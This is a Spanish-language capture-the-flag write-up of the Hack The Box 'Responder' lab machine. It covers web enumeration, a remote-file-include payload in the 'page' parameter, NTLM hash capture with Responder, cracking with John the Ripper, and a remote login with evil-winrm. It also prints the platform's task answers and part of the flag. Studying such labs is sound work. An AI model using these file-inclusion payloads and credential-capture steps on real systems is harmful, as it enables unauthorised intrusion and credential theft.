---
title: Responder Writeup
date: 2023-05-24 
categories: [Writeups, Hackthebox]
tags: [Starting Point, Windows, Very Easy]
---
![img](/assets/img/post/responder/responder.png)

En este articulo vamos a estar resolviendo la maquina Responder de Htb.

## Skills


- Web Enumeration
- Remote File Inclusion 
- Hash Cracking

## Reconocimiento
Hacemos un ping a la maquina:

![img](/assets/img/post/responder/ping.png)

Le enviamos un paquete y nos lo devuelve, por lo que tenemos conexion con la maquina.

El ttl es de 127, por lo que podriamos pensar que es una maquina windows.

Vamos a Escanear la maquina vitima:
```bash
❯ nmap -p- --min-rate 5000 -sV 10.129.143.121
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 13:24 CDT
Nmap scan report for 10.129.143.121 (10.129.143.121)
Host is up (0.060s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.42 seconds
❯ nano /etc/hosts
```
Tenemos 3 puertos abiertos, lo primero que hare es mirar el puerto 80, ya que este dispone de un servicio web.

Despues de agregar el dominio a mi etc/hosts, puedo ver esto:

![img](/assets/img/post/responder/web.png)

Que Servicios corren en esta web?

Estos:
```bash
❯ whatweb http://unika.htb
http://unika.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[info@unika.htb], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.143.121], JQuery[1.11.1], OpenSSL[1.1.1m], PHP[8.1.1], Script, Title[Unika], X-Powered-By[PHP/8.1.1], X-UA-Compatible[IE=edge]
```

Tenemos:
- Windows Server
- Php 8.1.1
- Apache HTTP Server 2.4.52
- OpenSSL 1.1.1

Ya tenemos Bastante informacion, Pasemos al fase de enumeracion.

## Enumeracion

Ahora vamos a hacer fuzzing con gobuster:
```bash
❯ gobuster dir -u http://unika.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html
```
Le decimos que queremos filtra por la extencion html con el parametro -x 

![img](/assets/img/post/responder/french.png)

Hemos encotrado varios directorios que al parecer son direntes idiomas disponibles en la pagina.

![img](/assets/img/post/responder/page.png)

Comprobando este sitio, podemos ver que la funcionalidad de "cambio de idioma" se realiza a través del parámetro "page".

## Explotacion
Vamos a Utilizar la Herramienta Responder que nos proporciona HTB:

```bash 
❯ git clone https://github.com/lgandx/Responder.git
```

```bash
❯ sudo responder -I tun0
```
tenemos el hash NTLM del Administrador vamos a crackearlo usando john the ripper

![img](/assets/img/post/responder/hash.png)

Vamos a guardar todo el contenido en un archivo .txt
```bash
❯ echo "Administrator::RESPONDER:98524f720dc247ab:5765E77881413F67BAE10F637D1B560B:0101000000000000004A8CC30E72D901875B7F22E56A60900000000002000800440035004900310001001E00570049004E002D005300510042003800360049004100500058003400430004003400570049004E002D00530051004200380036004900410050005800340043002E0044003500490031002E004C004F00430041004C000300140044003500490031002E004C004F00430041004C000500140044003500490031002E004C004F00430041004C0007000800004A8CC30E72D90106000400020000000800300030000000000000000100000000200000F0143F1E889214E8802F3308189A269636026442427AF611645701179C68D1710A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200330039000000000000000000" > hash.txt
```
Ahora con la john, vamos a crakear esto:

```bash
❯ john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
Nos da el siguiente resultado:
```bash
badminton        (Administrator) 
```
Ahora con evil-winrm nos conectamos a la maquina victima, esta herramienta lo que hace es que Permite a los usuarios autenticarse y establecer una conexión con un sistema Windows a través de WinRM utilizando credenciales válidas.

```bash
evil-winrm -i 10.129.143.121 -u administrator -p badminton
```

Listo

Nos vamos al Usuario Mike.

![img](/assets/img/post/responder/mike.png)

Ya tenemos la flag.
```bash
*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed*****
```
## Tasks
Ahora vamos a responde las preguntas que nos hacen en la plataforma.

### Task 1. When visiting the web service using the IP address, what is the domain that we are being redirected to?
```text
unika.htb
```

### Task 2. Which scripting language is being used on the server to generate webpages?
```text
php
```

### Task 3. What is the name of the URL parameter which is used to load different language versions of the webpage?
```text
page
```

### Task 4. Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
```text
../../../../../../../../windows/system32/drivers/etc/hosts
```

### Task 5. Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
```text
//10.10.14.6/somefile
```

### Task 6. What does NTLM stand for?
```text
New Technology Lan Manager
```

### Task 7. Which flag do we use in the Responder utility to specify the network interface?
```text
-I
```

### Task 8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

```text
John The Ripper
```

### Task 9. What is the password for the administrator user?
```text
badminton
```

### Task 10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

```text
5985
```
### Submit Flag:
```text
ea81b7afddd03efaa0945333ed147***
```


